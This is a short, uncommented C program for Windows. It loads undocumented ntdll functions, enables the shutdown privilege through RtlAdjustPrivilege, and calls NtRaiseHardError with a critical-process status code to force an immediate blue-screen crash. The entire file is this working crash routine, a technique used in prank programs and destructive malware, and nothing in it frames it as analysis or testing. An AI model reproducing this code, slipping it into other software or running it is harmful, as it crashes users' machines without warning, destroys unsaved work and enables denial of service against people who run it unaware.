#include <windows.h>
#include <stdio.h>

typedef struct _LSA_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef enum _HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, *PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE {
    ResponseReturnToCaller,
    ResponseNotHandled,
    ResponseAbort,
    ResponseCancel,
    ResponseIgnore,
    ResponseNo,
    ResponseOk,
    ResponseRetry,
    ResponseYes
} HARDERROR_RESPONSE, *PHARDERROR_RESPONSE;

int main(void){
	typedef UINT(CALLBACK* NTRAISEHARDERROR)(LONG, ULONG, PUNICODE_STRING, PVOID,HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE);
	typedef UINT(CALLBACK* RTLADJUSTPRIVILEGE)(ULONG, BOOL, BOOL, PINT);
    
	NTRAISEHARDERROR NtRaiseHardError;
	RTLADJUSTPRIVILEGE RtlAdjustPrivilege;
    
    HANDLE ntdll = LoadLibrary(TEXT("ntdll.dll"));
	
	NtRaiseHardError = (NTRAISEHARDERROR)GetProcAddress(ntdll, "NtRaiseHardError");
	RtlAdjustPrivilege = (RTLADJUSTPRIVILEGE)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    int nEn=0;
    HARDERROR_RESPONSE reResponse;
	RtlAdjustPrivilege(0x13, TRUE, FALSE, &nEn);
	NtRaiseHardError(0xC000021A,0,0,0,OptionShutdownSystem,&reResponse);
}
